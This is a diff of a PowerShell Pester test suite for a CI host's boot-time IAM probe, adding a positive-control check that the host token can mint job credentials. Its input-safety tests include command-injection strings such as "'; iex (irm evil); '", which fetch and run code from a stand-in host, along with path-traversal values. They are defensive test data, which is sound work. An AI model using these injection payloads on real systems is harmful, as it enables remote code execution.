@@ -986,12 +986,40 @@ Describe 'negative capability' {
     }
 }
 
+Describe 'positive capability' {
+    # The witness the negative checks do not have. Secret Manager answers 403
+    # for a resource the caller may not read AND for one that does not exist,
+    # so without one assertion running the other way the whole probe passes on
+    # an identity that can do nothing at all.
+    It 'accepts a 200 and only a 200' {
+        Test-PositiveCapability -StatusCode 200 | Should -BeTrue
+        Test-PositiveCapability -StatusCode '200' | Should -BeTrue
+    }
+
+    # Either the grant is gone -- no job on this host can get its credentials --
+    # or everything this probe touched answers 403 for a reason unrelated to
+    # IAM, in which case the two negative checks proved nothing.
+    It 'rejects a 403, which is the finding' {
+        Test-PositiveCapability -StatusCode 403 | Should -BeFalse
+    }
+
+    # The mirror of the negative rule, and it bites harder here: this check
+    # exists to prove the measurement works, so accepting a failure to measure
+    # would let it certify itself.
+    It 'reads an unreachable endpoint or a credential-less call as unproved' {
+        Test-PositiveCapability -StatusCode $null | Should -BeFalse
+        Test-PositiveCapability -StatusCode 401 | Should -BeFalse
+        Test-PositiveCapability -StatusCode 'timeout' | Should -BeFalse
+    }
+}
+
 Describe 'probe verdict' {
     BeforeAll {
         $script:CleanProbe = {
             [pscustomobject] @{
                 runningAs     = 'CI-HOST-ABCD\ci-s1'
                 hostToken     = $true; secretStatus = 403; metricStatus = 403
+                impersonateStatus = 200; impersonateAttempts = 1
                 brokerEmail   = 'jobs@p.iam.gserviceaccount.com'
                 siblingStatus = 'denied'; cacheWritable = $true; dnsResolved = $true
             }
@@ -1051,7 +1079,63 @@ Describe 'probe verdict' {
     It 'passes a no-broker pool that reported no broker' {
         $r = & $script:CleanProbe
         $r.brokerEmail = ''
+        # A pool with no job service account has no impersonation to prove, and
+        # Get-ProbeScript omits the call rather than disabling it -- so the
+        # honest verdict from such a host carries no status at all.
+        $r.impersonateStatus = $null
+        $r.impersonateAttempts = $null
         Get-ProbeFailure -Result $r -JobServiceAccount '' -ExpectedIdentity 'ci-s1' | Should -BeNullOrEmpty
+    }
+
+    # THE VACUITY FIX (#157). Every other capability assertion is negative, and
+    # 403 is what Secret Manager answers for a secret that is not there as well
+    # as for one this host may not read -- so a host whose token can do nothing
+    # at all scores a perfect boundary without this one.
+    It 'fails a host whose token cannot mint the job credentials it is meant to' {
+        $r = & $script:CleanProbe
+        $r.impersonateStatus = 403
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'generateAccessToken'
+    }
+
+    # The sentence has to say WHY a missing capability invalidates the refusals
+    # above it, or the next reader treats a positive control as a nice-to-have
+    # and relaxes it to a warning on the first flaky boot.
+    It 'says that a failed positive control voids the two refusals beside it' {
+        $r = & $script:CleanProbe
+        $r.impersonateStatus = 403
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'answers 403 to everything'
+    }
+
+    # Unproved is not proved, exactly as for the negative checks: a call that
+    # never reached Google says nothing about what the token can do.
+    It 'fails a positive control that could not be measured at all' {
+        $r = & $script:CleanProbe
+        $r.impersonateStatus = $null
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'generateAccessToken'
+    }
+
+    # The retry exists so a binding that is seconds old does not deny a boot,
+    # which means the operator needs to know whether the grant was absent for
+    # twenty seconds or was never there at all.
+    It 'reports how many attempts the positive control was given' {
+        $r = & $script:CleanProbe
+        $r.impersonateStatus = 403
+        $r.impersonateAttempts = 3
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'after 3 attempt'
+    }
+
+    # A status from a pool that configured no job service account means the
+    # payload on disk is not the one this configuration builds -- the same
+    # drift the broker arm refuses, and it must not read as a bonus pass.
+    It 'fails a verdict that minted a job token on a pool with no job identity' {
+        $r = & $script:CleanProbe
+        $r.brokerEmail = ''
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount '' -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'not the one this configuration builds'
     }
 
     It 'fails a slot that could read a sibling workspace' {
@@ -1136,7 +1220,7 @@ Describe 'probe verdict' {
             brokerEmail   = ''; siblingStatus = 'allowed'; cacheWritable = $false; dnsResolved = $false
         }
         @(Get-ProbeFailure -Result $r -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1').Count |
-            Should -Be 7
+            Should -Be 8
     }
 
     # A verdict written by an older image lacks fields this one reads. Absent is
@@ -1204,7 +1288,8 @@ Describe 'jittered timeout' {
 
 Describe 'probe payload' {
     BeforeAll {
-        $script:Payload = Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '127.0.0.1:8081' `
+        $script:Payload = Get-ProbeScript -SecretName 'app-key' `
+            -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -BrokerEndpoint '127.0.0.1:8081' `
             -SiblingWorkspace 'C:\ci\slots\ci-s2\w' -CacheRoot 'C:\ci\slots\ci-s1\w' `
             -ResultPath 'C:\ci\boot-probe.json'
     }
@@ -1272,9 +1357,51 @@ Describe 'probe payload' {
     }
 
     It 'omits the broker read entirely when there is no broker' {
-        $p = Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+        $p = Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
             -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1'
         $p | Should -Not -Match 'service-accounts/default/email'
+    }
+
+    # The positive control, in the payload rather than in the verdict reader:
+    # Get-ProbeFailure can only judge a status the payload actually went and
+    # got, so a call that is not in the text is a check that never happened.
+    It 'asks whether the host token can still mint the job credentials' {
+        $script:Payload | Should -Match 'iamcredentials\.googleapis\.com'
+        $script:Payload |
+            Should -Match 'serviceAccounts/jobs@p\.iam\.gserviceaccount\.com:generateAccessToken'
+    }
+
+    # OMITTED, not disabled -- the same rule as the broker read. A pool with no
+    # job identity has no impersonation to prove, and a runtime `if` would leave
+    # the call in the text for somebody to later "simplify" the guard off.
+    It 'omits the impersonation call entirely on a pool with no job identity' {
+        $p = Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
+            -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1'
+        $p | Should -Not -Match 'iamcredentials'
+    }
+
+    # The response body is a live access token for the job service account. The
+    # question asked is whether the call is PERMITTED, so the body must never be
+    # bound to a variable, let alone written into the verdict file.
+    It 'never keeps the token the positive control mints' {
+        # One call, and it goes through Get-Status -- whose success path is
+        # `$null = Invoke-WebRequest ...; return 200`, so the body is discarded
+        # rather than bound. A second occurrence of the host would mean some
+        # other statement is holding the response.
+        $lines = @($script:Payload -split "`n" | Where-Object { $_ -match 'iamcredentials' })
+        $lines.Count | Should -Be 1
+        $lines[0] | Should -Match '^\s*-Uri '
+        $script:Payload | Should -Match 'impersonateStatus = Get-Status'
+    }
+
+    # A binding created seconds ago by the same apply that created the pool is
+    # not always in force yet, and this is the only assertion in the payload
+    # whose subject is an IAM binding. Without the retry the first boot after a
+    # fresh apply denies itself and `keep:at-floor` pins that host at min_hosts.
+    It 'gives the positive control a bounded retry the other checks do not get' {
+        $script:Payload | Should -Match 'for \(\$i = 1; \$i -le 3; \$i\+\+\)'
+        $script:Payload | Should -Match 'Start-Sleep -Seconds 10'
+        $script:Payload | Should -Match 'impersonateAttempts'
     }
 }
 
@@ -1310,13 +1437,13 @@ Describe 'probe literal safety' {
     # Throw, not sanitize: a stripped value still builds a payload, and a
     # payload that measured the wrong secret is worse than a stopped boot.
     It 'refuses to build a payload from an injected secret name' {
-        { Get-ProbeScript -SecretName "k'; iex (irm evil); '" -BrokerEndpoint '' `
+        { Get-ProbeScript -SecretName "k'; iex (irm evil); '" -JobServiceAccount '' -BrokerEndpoint '' `
                 -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
             Should -Throw -ExpectedMessage '*interpolated as code*'
     }
 
     It 'refuses to build a payload from an injected broker endpoint' {
-        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint "1.2.3.4:1'; iex (irm evil); '" `
+        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint "1.2.3.4:1'; iex (irm evil); '" `
                 -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
             Should -Throw -ExpectedMessage '*interpolated as code*'
     }
@@ -1327,18 +1454,40 @@ Describe 'probe literal safety' {
     It 'validates the metadata root it was handed, not just the ones from metadata' {
         Test-ProbeLiteral -Value 'http://169.254.169.254/computeMetadata/v1' -Kind 'url' | Should -BeTrue
         Test-ProbeLiteral -Value "http://h/v1'; iex (irm evil); '" -Kind 'url' | Should -BeFalse
-        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
                 -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' `
                 -MetadataRoot "http://h/v1'; iex (irm evil); '" } |
             Should -Throw -ExpectedMessage '*interpolated as code*'
     }
 
+    # The job service account is interpolated into a URL inside the payload, so
+    # it is code like every other value here -- and it arrives from the same
+    # instance metadata section 3A says is writable by anything holding the
+    # machine's identity.
+    It 'accepts a service-account email and rejects one carrying a payload' {
+        Test-ProbeLiteral -Value 'ci-job@example-project.iam.gserviceaccount.com' -Kind 'email' |
+            Should -BeTrue
+        Test-ProbeLiteral -Value '' -Kind 'email' | Should -BeTrue
+        Test-ProbeLiteral -Value "j@p.com'; iex (irm evil); '" -Kind 'email' | Should -BeFalse
+        Test-ProbeLiteral -Value 'j$(hostname)@p.com' -Kind 'email' | Should -BeFalse
+        # A slash would let a crafted value walk out of the resource path it is
+        # spliced into and address a different IAM method entirely.
+        Test-ProbeLiteral -Value 'j@p.com/../../evil' -Kind 'email' | Should -BeFalse
+    }
+
+    It 'refuses to build a payload from an injected job service account' {
+        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount "j@p.com'; iex (irm evil); '" `
+                -BrokerEndpoint '' -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+    }
+
     It 'refuses to build a payload from an injected path' {
-        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
                 -SiblingWorkspace "C:\s2'; iex (irm evil); '" -CacheRoot 'C:\s1' } |
             Should -Throw -ExpectedMessage '*interpolated as code*'
-        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
-                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' -ResultPath "C:'; iex (irm evil); '" } |
+        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' -ResultPath "C:
+'; iex (irm evil); '" } |
             Should -Throw -ExpectedMessage '*interpolated as code*'
     }
 }
